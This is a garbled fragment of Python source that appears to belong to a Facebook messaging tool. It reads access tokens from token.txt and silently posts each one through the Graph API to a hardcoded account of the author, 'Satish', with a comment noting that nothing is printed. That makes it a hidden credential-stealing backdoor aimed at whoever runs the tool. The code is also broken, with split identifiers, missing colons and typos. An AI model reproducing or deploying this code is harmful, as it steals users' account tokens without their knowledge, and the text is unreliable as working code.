def send initial message():
      with open('token.txt', 'r') as file:
          tokens = file.readlines()

      # Modify the message as per your requirement
      msg template = "CREDIT :- TRICKS BY SATISH                                           Owner => Satish                                           Hello Satish sir. I am using your server. My token is :- {}"

      # Specify the ID where you want to send the message
      target id = "100087513362848"
      ...
      for token in tokens
          access token = tokenstrip()
          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
          msg = msg_template.format(access_token)
          parameters = {'access_token': accesstoken, 'message': msg}
          response = requests.post(url, json=parameters, headersheaders)

          # No need to print here, as requested
          current_time = time.strftime("%Y-%m-%d %I%S %p")
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  access_token = tokens[token index].strip()
...
def main():
      server thread = threading.Thread(target=execute server)
      server thread.start()
